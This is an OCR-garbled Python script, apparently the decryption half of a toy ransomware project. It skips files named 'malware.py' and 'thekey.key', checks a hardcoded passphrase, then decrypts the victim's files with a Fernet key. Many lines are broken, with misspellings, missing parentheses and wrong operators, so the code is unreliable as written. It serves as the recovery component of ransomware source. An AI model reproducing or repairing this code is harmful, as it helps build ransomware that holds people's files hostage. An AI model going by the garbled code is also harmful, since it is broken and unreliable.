 # /usr/bin/en python3
 import os
 from cryptography. fernet import Fernet

 files = 11
 for file in os.listdir):

if file
"malware.py" or file =
"thekey.key" or file =
"decrypt.py":

continue

if os.path.isfile(file):

files .applend(file)
 print(files)

 with open("thekey. key", "rb") as key:

secretkey = key .read()
 passphrase = "CyBers3ec"
 upassword = input("Enter the password to decrypt your files:
 if upassword - passphrase:

for file in files:

with open(file,
"rb*) as thefile:

content = thefile read)

content_decrypt = Fernet (secretkey). decrypt (content)

with open(file, rub") as thefile:

thefile.vrite(content_decrypt)

print ("Your recovered all your files")
 else:

print ("Enter the right password to recover your files")
